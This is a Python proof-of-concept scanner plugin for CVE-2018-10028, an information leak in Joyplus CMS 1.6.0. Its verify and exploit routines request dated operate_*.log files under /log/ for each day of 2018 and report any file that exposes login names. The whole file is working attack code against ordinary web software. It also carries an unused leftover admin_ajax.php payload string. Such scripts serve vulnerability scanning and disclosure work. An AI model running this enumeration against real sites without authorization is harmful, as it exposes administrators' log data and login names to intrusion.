# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import datetime


class Vuln(ABVuln):
    vuln_id = 'joyplus-cms_0002'  # 平台漏洞编号
    name = 'Joyplus CMS信息泄露'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2018-05-03'  # 漏洞公布时间
    desc = '''
    Joyplus CMS 1.6.0存在信息泄露漏洞。远程攻击者可通过直接请求log文件夹，通过穷举日志文件名可以利用该漏洞获取敏感日志信息。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-08863'
    cnvd_id = 'CNVD-2018-08863'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10028'  # cve编号
    product = 'joyplus-cms'  # 漏洞组件名称
    product_version = '1.6.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'df7f3823-8caf-4cd2-9ce5-8fa92dd6ff2a'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/manager/admin_ajax.php?action=save&tab={pre}thirdpart_config"
            start = '2018-01-01'
            end = '2018-12-31'
            datestart = datetime.datetime.strptime(start, '%Y-%m-%d')
            dateend = datetime.datetime.strptime(end, '%Y-%m-%d')
            while datestart < dateend:
                datestart += datetime.timedelta(days=1)
                payload = datestart.strftime('%Y-%m-%d')

                vul_url = arg + '/log/operate_'+payload+'.log'
                respose = requests.get(vul_url)

                if respose.status_code == 200 and 'loginame' in respose.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                    break
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)

            payload = "/manager/admin_ajax.php?action=save&tab={pre}thirdpart_config"
            start = '2018-01-01'
            end = '2018-12-31'
            datestart = datetime.datetime.strptime(start, '%Y-%m-%d')
            dateend = datetime.datetime.strptime(end, '%Y-%m-%d')
            while datestart < dateend:
                datestart += datetime.timedelta(days=1)
                payload = datestart.strftime('%Y-%m-%d')

                vul_url = arg + '/log/operate_'+payload+'.log'
                respose = requests.get(vul_url)

                if respose.status_code == 200 and 'loginame' in respose.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取的漏洞url地址为{url}'.format(
                        target=self.target, name=self.vuln.name, url=vul_url))
                    break
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
